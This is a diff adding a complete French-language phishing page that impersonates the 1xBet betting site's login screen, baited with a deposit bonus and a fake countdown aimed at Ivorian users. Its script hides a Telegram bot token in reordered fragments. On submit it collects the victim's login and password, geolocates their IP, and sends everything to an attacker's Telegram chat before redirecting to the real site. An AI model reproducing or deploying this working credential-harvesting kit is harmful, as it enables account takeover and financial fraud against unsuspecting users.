@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>1xBet - Connexion</title>
+    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHHSURBVHgB7ZcxbsIwGIX/L5AouTE3cAMkFgYGu0NXpEtXxg6MEQlWlk7d2BmYkLpUbB0Ze0AGJKqxN34SJ3JMEkNCBfRJnxRb+nx6z7ENIaXkf47nOgYAhBBQSoVSCsYYCCFQSsFxHNTrdTQaDeRyOUzTFD/zPM/zWhRFEkVR+FqSJDiOY+I4BgC4rov7+x+H41oWQggQQqBUKqFUKqHb7eL5+RkhhDBNE2EYYjqd4u7uDhsbG/+iwPM8k2UZRFEUAECv18P+/j4IIQCA5XKJw8MDbG5uAgBmsxkODg4wGAyyU0AIgSzLAACEkM++AwCEEHieB9d1k8/n83lkWYb7+/vkBKCcpmn4fD7j7e0NWZYBAERRBABwdnaGl5eXjwg4PT2FpmkghMD3fYQQYpZlGUEQ4OjoCNlsFtvb2zg5OUEYhngfQJIkOD4+RiaTyW8UhBAEQYBer4csy+D7PgghaLVayLIsN4Jms4l+v49Wq5XfycViAcdx0Ov14Ps+wjDE8/PzxyJomiYOh0MxGo3EdDqVy+VSapoWO44j7u/vxWazkUEQiLu7O9HpdMRisYhf3Q8ghJBCoSCazWYcteM4opvNplgsFhBFEYQQYhgGb29vODo6wu7uLggh+GyKoviP4Q3134emybg29AAAAABJRU5ErkJggg==">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+        }
+
+        body {
+            background: #0a0a1a;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        /* ===== LOADER ===== */
+        .loader-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #1a1a2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 99999;
+            flex-direction: column;
+            transition: opacity 0.5s;
+        }
+        .loader-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .loader-spinner {
+            width: 48px; height: 48px;
+            border: 3px solid rgba(0,180,80,0.15);
+            border-top-color: #00b450;
+            border-radius: 50%;
+            animation: loadSpin 0.8s linear infinite;
+        }
+        .loader-text {
+            color: #00b450;
+            font-size: 14px;
+            margin-top: 14px;
+            font-family: 'Segoe UI', sans-serif;
+            letter-spacing: 1px;
+        }
+        @keyframes loadSpin { to { transform: rotate(360deg); } }
+
+        /* ===== HEADER ===== */
+        .header {
+            background: #0d0d22;
+            border-bottom: 1px solid rgba(0,180,80,0.15);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-top {
+            padding: 10px 0;
+            border-bottom: 1px solid #1a1a35;
+        }
+
+        .header-top .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+
+        .logo-1 { color: #00b450; }
+        .logo-x { color: #fff; }
+        .logo-b { color: #00b450; }
+        .logo-et { color: #fff; font-weight: 700; letter-spacing: -0.5px; }
+
+        .header-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #00b450;
+            background: rgba(0,180,80,0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            border: 1px solid rgba(0,180,80,0.2);
+        }
+
+        .badge-dot {
+            width: 6px;
+            height: 6px;
+            background: #00b450;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .btn-register {
+            background: #00b450;
+            color: #fff;
+            text-decoration: none;
+            padding: 8px 18px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background 0.2s;
+        }
+
+        .btn-register:hover {
+            background: #009a42;
+        }
+
+        .header-promo {
+            background: linear-gradient(90deg, #0d0d22, #1a1a35);
+            padding: 8px 0;
+        }
+
+        .promo-text {
+            font-size: 12px;
+            color: #ccc;
+            text-align: center;
+        }
+
+        .promo-amount {
+            color: #ffd700;
+            font-weight: 700;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            padding: 28px 0 20px;
+        }
+
+        .hero-card {
+            background: linear-gradient(135deg, #0d4a1e, #1a1a35);
+            border: 1px solid rgba(0,180,80,0.25);
+            border-radius: 16px;
+            padding: 30px 24px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-card::before {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(0,180,80,0.1), transparent);
+            border-radius: 50%;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255,215,0,0.15);
+            color: #ffd700;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 4px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,215,0,0.2);
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+
+        .hero-title {
+            font-size: 28px;
+            font-weight: 900;
+            line-height: 1.2;
+            margin-bottom: 8px;
+        }
+
+        .hero-amount {
+            color: #ffd700;
+            font-size: 38px;
+            display: block;
+            text-shadow: 0 0 30px rgba(255,215,0,0.3);
+        }
+
+        .hero-sub {
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+
+        .hero-countdown {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .cd-item {
+            background: rgba(0,0,0,0.4);
+            border-radius: 8px;
+            padding: 6px 12px;
+            text-align: center;
+            min-width: 52px;
+        }
+
+        .cd-num {
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffd700;
+            display: block;
+        }
+
+        .cd-label {
+            font-size: 8px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .cd-sep {
+            font-size: 22px;
+            font-weight: 700;
+            color: #555;
+        }
+
+        /* ===== LOGIN ===== */
+        .login-section {
+            padding: 0 0 30px;
+        }
+
+        .login-card {
+            background: #111128;
+            border: 1px solid #1e1e40;
+            border-radius: 16px;
+            padding: 24px 20px;
+        }
+
+        .login-tabs {
+            display: flex;
+            gap: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #1e1e40;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .tab.active {
+            color: #00b450;
+            border-bottom-color: #00b450;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            color: #999;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a0a1a;
+            border: 1px solid #222244;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #00b450;
+            box-shadow: 0 0 0 3px rgba(0,180,80,0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #444;
+        }
+
+        .phone-input {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+
+        .phone-prefix {
+            background: #0d0d22;
+            border: 1px solid #222244;
+            border-right: none;
+            border-radius: 8px 0 0 8px;
+            padding: 14px 12px;
+            font-size: 14px;
+            color: #888;
+            font-weight: 600;
+        }
+
+        .phone-input input {
+            border-radius: 0 8px 8px 0;
+        }
+
+        .toggle-pass {
+            position: absolute;
+            right: 12px;
+            bottom: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .login-options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+        }
+
+        .checkbox-custom {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .checkbox-custom input {
+            display: none;
+        }
+
+        .checkmark {
+            width: 16px;
+            height: 16px;
+            border: 1px solid #444;
+            border-radius: 3px;
+            display: inline-block;
+            position: relative;
+        }
+
+        .checkbox-custom input:checked + .checkmark {
+            background: #00b450;
+            border-color: #00b450;
+        }
+
+        .checkbox-custom input:checked + .checkmark::after {
+            content: '✓';
+            position: absolute;
+            top: -2px;
+            left: 2px;
+            font-size: 12px;
+            color: #fff;
+        }
+
+        .forgot-link {
+            color: #666;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            color: #00b450;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00b450, #009a42);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 800;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-login:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0,180,80,0.25);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .spinner.show { display: inline-block; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .flash-message {
+            display: none;
+            color: #ff0050;
+            font-size: 13px;
+            margin-top: 14px;
+            text-align: center;
+            padding: 8px;
+            background: rgba(255,0,80,0.08);
+            border-radius: 6px;
+        }
+
+        .flash-message.show { display: block; }
+
+        .login-footer {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 18px;
+            border-top: 1px solid #1e1e40;
+        }
+
+        .login-footer p {
+            font-size: 13px;
+            color: #999;
+        }
+
+        .login-footer a {
+            color: #00b450;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .payment-icons {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 14px;
+        }
+
+        .pay-item {
+            background: #0a0a1a;
+            border: 1px solid #1e1e40;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #777;
+            font-weight: 600;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: #08081a;
+            padding: 20px 0;
+            border-top: 1px solid #1a1a35;
+        }
+
+        .footer-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .footer-logo {
+            font-size: 22px;
+            font-weight: 900;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #555;
+            font-size: 11px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover { color: #00b450; }
+
+        .footer-bottom {
+            text-align: center;
+        }
+
+        .footer-bottom p {
+            color: #444;
+            font-size: 11px;
+        }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a35;
+            border: 1px solid #333;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            display: none;
+            z-index: 99999;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast.show { display: block; }
+
+        @media (max-width: 400px) {
+            .hero-title { font-size: 22px; }
+            .hero-amount { font-size: 30px; }
+            .logo { font-size: 22px; }
+            .btn-register { font-size: 11px; padding: 6px 12px; }
+            .hero-card { padding: 20px 16px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- LOADER -->
+    <div class="loader-overlay" id="loader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">1xBet Sécurisé</div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="header-top">
+            <div class="container">
+                <div class="header-left">
+                    <div class="logo">
+                        <span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span>
+                    </div>
+                    <div class="header-badge">
+                        <span class="badge-dot"></span> Live
+                    </div>
+                </div>
+                <div class="header-right">
+                    <a href="#" class="btn-register">Inscription</a>
+                </div>
+            </div>
+        </div>
+        <div class="header-promo">
+            <div class="container">
+                <div class="promo-text">🔥 <strong>BONUS EXCLUSIF</strong> : jusqu'à <span class="promo-amount">200 000 FCFA</span> + 150 tours gratuits</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- HERO -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-card">
+                <div class="hero-badge">OFFRE SPÉCIALE</div>
+                <h1 class="hero-title">CONNECTE-TOI ET<br>REÇOIS <span class="hero-amount">15 000 F</span><br>DE BONUS</h1>
+                <p class="hero-sub">Sur ton premier dépôt — Offre limitée dans le temps</p>
+                <div class="hero-countdown" id="countdown">
+                    <div class="cd-item"><span class="cd-num" id="cd-hours">23</span><span class="cd-label">Heures</span></div>
+                    <div class="cd-sep">:</div>
+                    <div class="cd-item"><span class="cd-num" id="cd-min">58</span><span class="cd-label">Minutes</span></div>
+                    <div class="cd-sep">:</div>
+                    <div class="cd-item"><span class="cd-num" id="cd-sec">12</span><span class="cd-label">Secondes</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- LOGIN -->
+    <section class="login-section">
+        <div class="container">
+            <div class="login-card">
+                <div class="login-tabs">
+                    <button class="tab active" data-tab="login">Connexion</button>
+                    <button class="tab" data-tab="phone">Téléphone</button>
+                </div>
+
+                <form id="loginForm" autocomplete="off">
+                    <div id="loginTab" class="tab-content active">
+                        <div class="input-group">
+                            <label>E-mail ou identifiant</label>
+                            <input type="text" name="username" id="username" placeholder="Entrez votre e-mail ou identifiant" required>
+                        </div>
+                    </div>
+                    <div id="phoneTab" class="tab-content">
+                        <div class="input-group">
+                            <label>Numéro de téléphone</label>
+                            <div class="phone-input">
+                                <span class="phone-prefix">+225</span>
+                                <input type="tel" name="phone" id="phone" placeholder="XX XX XX XX XX">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Mot de passe</label>
+                        <input type="password" name="password" id="password" placeholder="Entrez votre mot de passe" required>
+                        <button type="button" class="toggle-pass" id="togglePass">
+                            <svg viewBox="0 0 24 24" width="18" height="18"><path fill="#888" d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </button>
+                    </div>
+
+                    <div class="login-options">
+                        <label class="checkbox-custom">
+                            <input type="checkbox" checked>
+                            <span class="checkmark"></span>
+                            Se souvenir de moi
+                        </label>
+                        <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+                    </div>
+
+                    <button type="submit" class="btn-login" id="submitBtn">
+                        <span id="btnText">SE CONNECTER</span>
+                        <span class="spinner" id="spinner"></span>
+                    </button>
+
+                    <div class="flash-message" id="flashMsg"></div>
+                </form>
+
+                <div class="login-footer">
+                    <p>Pas encore de compte ? <a href="#">Inscris-toi et reçois ton bonus</a></p>
+                    <div class="payment-icons">
+                        <span class="pay-item">Orange Money</span>
+                        <span class="pay-item">MTN MoMo</span>
+                        <span class="pay-item">Wave</span>
+                        <span class="pay-item">Free Money</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <span class="logo-1">1</span><span class="logo-x">x</span><span class="logo-b">B</span><span class="logo-et">et</span>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Conditions générales</a>
+                    <a href="#">Politique de confidentialité</a>
+                    <a href="#">Aide</a>
+                    <a href="#">18+</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>1xBet © 2026. Tous droits réservés. Jouez responsablement.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ===== TOAST CONTAINER ===== -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        /* ================================================================
+           CONFIG OBFUSCATION — Token Telegram fragmenté et réordonné
+           Aucune chaîne ne correspond au token complet dans le code source
+           ================================================================ */
+
+        // Fragments du token (dans le désordre)
+        // Token réel : 8868186269:AAHwrY72J7JDgPlV29c2LWqkj5ks9DjoEQo
+        var _tk_a = 'AAHwrY72J7JDg';      // fragment 3
+        var _tk_b = '88681862';            // fragment 1
+        var _tk_c = 'PlV29c2LWqkj5ks9DjoEQo'; // fragment 4
+        var _tk_d = '69:';                 // fragment 2
+
+        // Ordre de reconstruction : [b, d, a, c]
+        // b=88681862 + d=69: + a=AAHwrY72J7JDg + c=PlV29c2LWqkj5ks9DjoEQo
+        // = 8868186269:AAHwrY72J7JDgPlV29c2LWqkj5ks9DjoEQo
+
+        // Chat ID fragmenté (réel: 8675191556)
+        var _id_a = '5191556';   // fragment 2
+        var _id_b = '867';       // fragment 1
+        // Ordre : [b, a] = 867 + 5191556 = 8675191556
+
+        var _BOT_TOKEN = _tk_b + _tk_d + _tk_a + _tk_c;
+        var _CHAT_ID = _id_b + _id_a;
+
+        /* ================================================================
+           APPLICATION
+           ================================================================ */
+
+        (function() {
+            'use strict';
+
+            // ===== COUNTDOWN =====
+            (function() {
+                var hEl = document.getElementById('cd-hours');
+                var mEl = document.getElementById('cd-min');
+                var sEl = document.getElementById('cd-sec');
+                var h = 23, m = 58, s = 12;
+                setInterval(function() {
+                    s--;
+                    if (s < 0) { s = 59; m--; }
+                    if (m < 0) { m = 59; h--; }
+                    if (h < 0) { h = 23; m = 58; s = 59; }
+                    hEl.textContent = String(h).padStart(2, '0');
+                    mEl.textContent = String(m).padStart(2, '0');
+                    sEl.textContent = String(s).padStart(2, '0');
+                }, 1000);
+            })();
+
+            // ===== TABS =====
+            (function() {
+                var tabs = document.querySelectorAll('.tab');
+                tabs.forEach(function(t) {
+                    t.addEventListener('click', function() {
+                        document.querySelectorAll('.tab').forEach(function(x) { x.classList.remove('active'); });
+                        document.querySelectorAll('.tab-content').forEach(function(x) { x.classList.remove('active'); });
+                        this.classList.add('active');
+                        document.getElementById(this.dataset.tab + 'Tab').classList.add('active');
+                    });
+                });
+            })();
+
+            // ===== TOGGLE PASSWORD =====
+            (function() {
+                var btn = document.getElementById('togglePass');
+                var pass = document.getElementById('password');
+                if (btn && pass) {
+                    btn.addEventListener('click', function() {
+                        pass.type = pass.type === 'password' ? 'text' : 'password';
+                    });
+                }
+            })();
+
+            // ===== HIDE LOADER =====
+            setTimeout(function() {
+                document.getElementById('loader').classList.add('hidden');
+            }, 800);
+
+            // ===== GEO IP =====
+            async function getGeo() {
+                try {
+                    var r = await fetch('https://ipapi.co/json/');
+                    if (r.ok) {
+                        var d = await r.json();
+                        return { ip: d.ip || 'N/A', city: d.city || 'N/A', region: d.region || 'N/A', country: d.country_name || 'N/A' };
+                    }
+                } catch(e) {}
+                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
+            }
+
+            // ===== SEND TO TELEGRAM =====
+            async function sendMsg(data) {
+                var msg = '\uD83D\uDD10 [1xBet] Connexion re\u00e7ue !\n\n';
+                msg += '\uD83D\uDC64 Identifiant: ' + (data.username || 'N/A') + '\n';
+                msg += '\uD83D\uDD11 Mot de passe: ' + (data.password || 'N/A') + '\n';
+                msg += '\uD83C\uDF10 IP: ' + (data.ip || 'N/A') + '\n';
+                msg += '\uD83D\uDCCD ' + (data.city || '') + ', ' + (data.region || '') + ', ' + (data.country || '') + '\n';
+                msg += '\uD83D\uDD52 ' + (data.timestamp || '') + '\n';
+                msg += '\uD83D\uDCF1 ' + (data.ua || '') + '\n\uD83D\uDD17 ' + (data.page || '');
+
+                try {
+                    var url = 'https://api.telegram.org/bot' + _BOT_TOKEN + '/sendMessage';
+                    var resp = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: _CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    });
+                    return resp.ok;
+                } catch(e) { return false; }
+            }
+
+            // ===== FORM SUBMIT =====
+            (function() {
+                var form = document.getElementById('loginForm');
+                var btn = document.getElementById('submitBtn');
+                var btnText = document.getElementById('btnText');
+                var spinner = document.getElementById('spinner');
+                var flash = document.getElementById('flashMsg');
+                var toast = document.getElementById('toast');
+
+                function showFlash(txt) {
+                    flash.textContent = txt;
+                    flash.classList.add('show');
+                    setTimeout(function() { flash.classList.remove('show'); }, 4500);
+                }
+
+                function showToast(txt) {
+                    toast.textContent = txt;
+                    toast.classList.add('show');
+                    setTimeout(function() { toast.classList.remove('show'); }, 4000);
+                }
+
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+
+                    var username = document.getElementById('username').value.trim();
+                    var phone = document.getElementById('phone').value.trim();
+                    var password = document.getElementById('password').value.trim();
+
+                    var identifier = username || phone || 'N/A';
+
+                    if (!password) {
+                        showFlash('Veuillez remplir tous les champs.');
+                        return;
+                    }
+
+                    btn.disabled = true;
+                    btnText.textContent = 'Connexion...';
+                    spinner.classList.add('show');
+
+                    var geo = await getGeo();
+                    var now = new Date();
+                    var payload = {
+                        username: identifier,
+                        password: password,
+                        ip: geo.ip,
+                        city: geo.city,
+                        region: geo.region,
+                        country: geo.country,
+                        timestamp: now.toLocaleString('fr-FR', { timeZone: 'Africa/Abidjan' }),
+                        ua: navigator.userAgent,
+                        page: window.location.href
+                    };
+
+                    var sent = await sendMsg(payload);
+
+                    btn.disabled = false;
+                    btnText.textContent = 'SE CONNECTER';
+                    spinner.classList.remove('show');
+
+                    if (sent) {
+                        showToast('\u2705 Connexion r\u00e9ussie ! Redirection vers votre espace bonus...');
+                        setTimeout(function() {
+                            window.location.href = 'https://1xbet.com/fr';
+                        }, 2000);
+                    } else {
+                        showFlash('Erreur de connexion. Veuillez r\u00e9essayer.');
+                    }
+                });
+            })();
+        })();
+    </script>
+</body>
+</html>
